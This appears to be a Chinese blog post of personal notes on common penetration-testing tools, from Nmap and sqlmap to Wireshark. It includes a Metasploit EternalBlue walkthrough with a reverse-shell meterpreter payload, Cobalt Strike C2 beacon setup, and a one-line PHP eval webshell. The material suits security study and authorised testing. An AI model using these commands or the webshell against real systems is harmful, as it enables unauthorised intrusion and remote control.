+++
date = '2026-05-09T17:12:25+08:00'
draft = false
title = '常用的渗透工具'
summary = '记录常用的渗透工具'
tags = ['Security','Tool']
toc = true

+++

## 信息收集

### Nmap

网络扫描与资产探测工具。

端口状态：

1. open
2. closed
3. filtered
4. unfiltered
5. open|filtered

常用命令

```bash 
1. nmap 192.168.1.1 # 扫描常见的1000个端口
2. nmap -p- ip      # 全端口扫描
3. nmap -p 80,443,8080 # 指定端口
4. nmap -sV ip      # 服务识别：Apache，Nginx，Mysql
5. nmap -O ip       # 操作系统识别

6. nmap -sS ip      # SYN半连接扫描： 快、隐蔽
7. nmap -sU ip      # UDP扫描：DNS等  慢
8. nmap -sn ip/24   # 探测存活主机 不扫描端口
9. nmap -Pn ip      # 跳过主机存活检测，有些服务器禁ICMP，不回Ping 
										# 不使用-Pn 会认为不存在

10. nmap --script vlun ip #使用NSE进行漏扫
```

Nmap快的原因：并发 + 原始数据包

SYN扫描：快 隐蔽 不建立连接 ；TCP连接：明显 容易被日志记录

### Masscan

速度很快 专注端口发现（异步高速发包）

```bash
1. masscan ip -p 80,443
2. masscan ip/24 -p 80
3. --rate 1000 # 速度太快容易网络阻塞、被IDS发现
```

### WhatWeb

网站指纹识别工具，用于识别：Web框架、CMS、中间件、编程语言

```bash
whatweb http://example.com
# 输出
Apache php8 Booststrap ···

# 参数
whatweb -a 1（温和）		whatweb -a 3（激进）
```

### Dirsearch

web目录扫描工具

通过字典进行不断请求，用于发现后台目录、隐藏页面、备份文件

```bash
python dirsearch.py -u http://example.com
-w list.txt # 指定字典
-e php,jsp,txt # 指定后缀
```

### Subfinder

子域名收集

```bash
subfinder -d example.com
-o result.txt # 保存结果
-t 50 # 多线程

```

### Fofa 、 Shodan 资产收集平台

## 漏洞扫描

### Xray

```bash
xray webscan --listen ip:port # 被动监听
xray webscan --url http://example.com # 主动扫描
```

误报低 插件优秀 能联动burpsuite

### AWVS

自动化强 误报率偏多。直接输入目标网址

### Burp + Scanner

专业版自带漏洞扫描

抓包（proxy）--> 右键Scan --> fuzz / payload注入

### Sqlmap

```bash 
# Get注入
sqlmap -u "http://test.com?id=1"
# Post注入
sqlmap -u http://test.com/login --data="user=1&pass=1"

--dbs # 获取数据库
-D test --tables # 获取表
```

跑不出来的原因：

WAF、参数加密、二次注入

### Nessus

## 抓包工具

### Burp

Http/Https 代理抓包

设置代理：`ip:8080` --> 开启Intercept --> 拦截请求 修改参数 --> send to Repeater

### Charles

Web层。适合手机抓包，用于App请求分析 API调试

### Wireshark

网络层抓包工具

```bash
ip.addr == ip  # 指定ip
tcp.port == 80 # 指定端口
```

分析攻击流量：木马、C2通信； 排查网络问题：丢包、重传

重点：

1. 过滤器
2. 右键 Follow Tcp Stream：查看完整通信内容
3. 过滤dns：查看域名解析，DNS隧道

### tcpdump

Linux命令行抓包工具

```bash
tcpdump -i eth0 # 抓指定网卡
tcpdump port 80 # 抓指定端口
tcpdump -w test.pcap # 然后放到wireshark分析
```



## 漏洞利用

### Metasploit（MSF）

本质：Exploit + Payload + Session 管理

```bash
# 核心结构
1. exploit（漏洞利用）
	永恒之蓝,Apache,Tomcat
2. payload（载荷）
	漏洞成功后执行：反弹shell、添加用户
3. Meterpreter
	功能：文件上传下载；摄像头；键盘记录；shell；提权
```

```bash
# 使用流程
1. msfconsole # 启动
2. search smb # 搜索漏洞
3. use exploit/windows/smb/ms17_010_eternalblue # 使用模块
4. show options #查看参数
5. set RHOST ip # 设置目标
6. set payload windows/x64/meterpreter/reverse_tcp # 设置payload
7. set LHOST ip #设置监听IP
run
成功后得到 meterpreter > 
```

### Cobalt Strike

后渗透与C2控制。C2：Command and Control

```bash
# 核心组件
TeamServer # 控制端
Beacon     # 木马、后门
Listener   # 监听器
```

```bash
# 基础流程
1. ./teamserver 192.168.1.100 password # 启动TeamServer
2. 输入IP 密码 # 客户端链接
3. 创建Listener：HTTP Beacon
4. 生成Payload ：EXE DLL PowerShell
5. 目标上线：Beacon 回连
```

beacon有休眠 比msf更隐蔽

## WebShell管理

### AntSword

`<?php eval($_POST['cmd']); ?>` 

文件管理、数据库管理、命令执行。常用于PHP Webshell

### Godzilla



## 内网渗透
